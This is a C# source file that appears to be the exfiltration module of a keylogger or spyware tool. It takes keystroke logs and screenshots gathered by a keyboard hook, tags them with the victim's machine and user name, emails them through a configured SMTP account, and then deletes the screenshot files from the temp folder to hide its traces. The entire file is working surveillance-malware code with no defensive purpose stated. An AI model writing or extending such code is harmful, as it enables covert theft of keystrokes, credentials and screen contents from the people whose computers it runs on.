using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Text;

namespace FSSyscat.Classes
{
    public class Mail
    {
        private static string _lastEmail = "";

        public static void SendMail(MailParameters data)
        {
            try
            {
                if (_lastEmail == data.Logstr) return;
                _lastEmail = data.Logstr;

                string subject = "Fichero de Log [" + System.Environment.MachineName + "]-[" + System.Environment.UserName + "]";

                FSMail.SendMail.Server = data.SmtpHost;
                FSMail.SendMail.Port = data.SmtpPort;
                FSMail.SendMail.EnableSSL = data.EnableSsl;
                FSMail.SendMail.User = data.Mailaddress;
                FSMail.SendMail.Password = data.Mailpassword;

                foreach (KeyData k in Hook.LogData)
                {
                    if (File.Exists(k.image))
                    {
                        FSMail.SendMail.AddAttachment(k.image);
                    }
                }

                FSMail.SendMail.SendMailMessage(data.Mailaddress, "", "", subject, data.Logstr, data.Mailaddress, data.Mailaddress, "");

                DeleteCaptures();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        public static void DeleteCaptures()
        {
            string tempPath = System.IO.Path.GetTempPath();

            foreach (FileInfo capture in new DirectoryInfo(tempPath).GetFiles("cpt_*.jpg"))
            {
                capture.Delete();
            }
        }
    }
}
